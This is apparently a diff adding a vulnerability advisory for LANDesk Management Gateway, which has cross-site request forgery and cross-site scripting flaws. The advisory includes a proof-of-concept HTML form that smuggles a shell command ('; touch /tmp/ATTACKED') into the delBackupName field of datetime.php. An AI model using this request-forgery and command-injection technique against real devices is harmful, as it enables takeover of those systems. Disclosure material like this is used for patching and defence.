@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/38119/info
+
+LANDesk Management Gateway is prone to a cross-site request-forgery vulnerability and a cross-site scripting vulnerability.
+
+An attacker can exploit the cross-site request forgery issue to alter the settings on affected devices. This may lead to further network-based attacks, including command-injection attacks to the device's underlying operating system, which can lead to a complete compromise of a vulnerable device.
+
+The attacker can exploit the cross-site scripting issue to execute arbitrary script code in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials. Other attacks are also possible. 
+
+<html> <head><title>LANDesk PoC</title></head> <body> <form method="post" action="https://www.example.com/gsb/datetime.php"> <input type="text" name="delBackupName" value="; touch /tmp/ATTACKED"> <input type="text" name="backupRestoreFormSubmitted" value="b"> <input type="submit" value="Attack!"> </form> </body> </html> 
